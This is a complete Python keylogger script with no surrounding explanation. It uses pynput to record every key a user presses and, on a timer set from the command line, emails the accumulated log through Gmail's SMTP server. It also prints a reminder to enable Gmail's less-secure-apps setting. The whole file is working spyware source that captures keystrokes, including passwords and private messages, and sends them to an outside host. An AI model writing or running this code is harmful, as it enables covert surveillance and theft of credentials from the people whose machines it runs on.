import pynput.keyboard #this library allow us to manage user keyboard and mouse
import threading
import smtplib
import optparse

log =""
def getargs():
    parser = optparse.OptionParser() #command line options and arguments
    parser.add_option("-e","--email",dest="email",help="your email")
    parser.add_option("-p","--password",dest="password",help="your email password")
    parser.add_option("-i","--interval",dest="interval",help="enter the time interval")
    (options,arg) = parser.parse_args()
    if not options.email:
        parser.error("Please Specify email --help for more info")
    elif not options.password:
        parser.error("please provide password --help for more info")
    elif not options.interval:
        parser.error("please provide interval --help for more info")
    return options
option = getargs()

def process_key_press(key):
    global log
    try:
        log=log+str(key.char)
    except AttributeError:
        if(key == key.space):
            log= log + " "
        else:
            log =log + " "+str(key)+" "

def send_mail(email, password,message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

def report():
    global log
    send_mail(option.email,option.password,log)
    log="" 
    timer = threading.Timer(int(option.interval),report) # use threding because we need report generation within interval 
    
    timer.start()

keyboard_listner = pynput.keyboard.Listener(on_press = process_key_press)

with keyboard_listner:
    print("https://myaccount.google.com/lesssecureapps?pli=1  make sure less secure app enable")
    report()
    keyboard_listner.join()

